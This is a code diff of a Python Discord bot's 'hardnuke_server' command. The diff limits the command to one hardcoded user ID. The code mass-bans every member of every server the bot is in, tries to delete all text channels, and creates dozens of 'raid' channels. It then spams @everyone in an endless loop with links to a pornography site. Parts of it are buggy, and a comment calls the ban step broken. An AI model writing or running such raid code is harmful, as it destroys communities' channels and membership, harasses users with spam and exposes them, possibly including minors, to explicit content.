@@ -165,63 +165,69 @@ async def nuke_server_fr(ctx):
 
 @bot.command(name='hardnuke_server', help='NUKES THE SERVER!!! ARGHHHHH NO!!!!! DONT!! PLSPLSPLS')
 async def nuke_server_fr(ctx):
-    if False:
+    if str(ctx.author.id) != '762152955382071316':
         print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
         await ctx.send("You don't have `Administrator` Permissions!")
     else:
-
-        
+       
         async def nuke_channel_2(txt):
             if False:
                 print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
                 await txt.send("You don't have `Administrator` Permissions!")
             else:
+                
                 try:
-                    text_channel_list = []
-                    for guild1 in bot.guilds:
-                        for channel in guild1.text_channels:
-                            text_channel_list = text_channel_list.append(channel)
+                    all_members_list = []
 
-                    for channel in text_channel_list:
-                        await channel.delete()
+                    for guild in bot.guilds:
+                        for membertemp in guild.members:
+                            all_members_list.append(membertemp)
 
-                except:
-                    None
+                    async def ban(self, *, member1: discord.Member, reason=None):
+                        await member1.ban(reason=reason)
 
-                finally:
-                    None
+                    for member in all_members_list:
+                        await ban(member1=member, self=None)
+                                
+                async def nukeallchannels(ctx):
+                    try:
+                        text_channel_list = []
+                        for guild1 in bot.guilds:
+                            for channel in guild1.text_channels:
+                                text_channel_list = text_channel_list.append(channel)
 
-        await nuke_channel_2(ctx)
+                        for channel in text_channel_list:
+                            await channel.delete()
 
+                    except:
+                        None
+
+                    finally:
+                        None
+                
+                await nuke_channel_2(ctx)
+                
         guild = ctx.message.guild
         newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
         for i in range(64):
             await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
 
-
-
         while True:
-            await newchannel.send('**<@everyone> RAIDED BY MZ FreeRobux '
-                                  'https://discord.gg/uAsCWzkNZd. EZ Noobs**')
+            await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
+EZ
+EZ
+EZ
+EZ
+EZ
+EZ
+http://pornhub.com/**""")
+            
             try:
                 await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                 await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
             except:
                 None
         
-        
-        all_members_list = []
-
-        for guild in bot.guilds:
-            for membertemp in guild.members:
-                all_members_list.append(membertemp)
-
-        async def ban(self, *, member1: discord.Member, reason=None):
-            await member1.ban(reason=reason)
-
-        for member in all_members_list:
-            await ban(member1=member, self=None)
-
 
 # ban part broken for now
 
